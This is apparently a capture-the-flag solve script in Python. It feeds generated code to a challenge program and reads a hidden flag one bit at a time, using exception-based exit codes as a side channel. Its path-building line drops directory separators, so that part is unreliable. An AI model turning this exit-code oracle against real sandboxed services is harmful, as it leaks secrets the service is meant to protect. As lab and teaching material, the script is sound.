def make_func(char_pos, bit_pos):
    return f"""def compute(n):
    char_pos = {char_pos}
    bit_pos = {bit_pos}

    flag_char = flag[char_pos]
    flag_bit = ord(flag_char) & (1 << bit_pos)

    if flag_bit == 0:
        raise IndexError
    else:
        raise ArithmeticError"""

import subprocess

def run(char_pos, bit_pos):
    # Get target pwnable
    pwd = ''.join(f'{__file__}'.split('/')[:-1])
    cmds = ['python', f'{pwd}/../error.py']

    # Construct python code for bit extraction
    func_str = make_func(char_pos, bit_pos)

    # Execute target pwnable
    res = subprocess.run(cmds, input=func_str.encode(), capture_output=True)
    return res.returncode


def getChar(char_pos):
    # Accumulate bit results
    bits = []

    # Get bits assuming utf-8
    for bit_pos in range(8):
        ret_code = run(char_pos, bit_pos)
        if ret_code == 2:
            # IndexError -> 2 when bit == 0
            bits.append(0)
        elif ret_code == 3:
            # ArithmeticError -> 3 when bit == 1
            bits.append(1)

    num = 0
    for index, value in enumerate(bits):
        num += value * (1 << index)

    return chr(num)

# Since flag format is known, get characters until '}'
flag_chars = ['{', 'f', 'l', 'a', 'g', '_']
while flag_chars[-1] != '}':
    char = getChar(len(flag_chars))
    flag_chars.append(char)

flag = ''.join(flag_chars)
print(f'flag = {flag}')
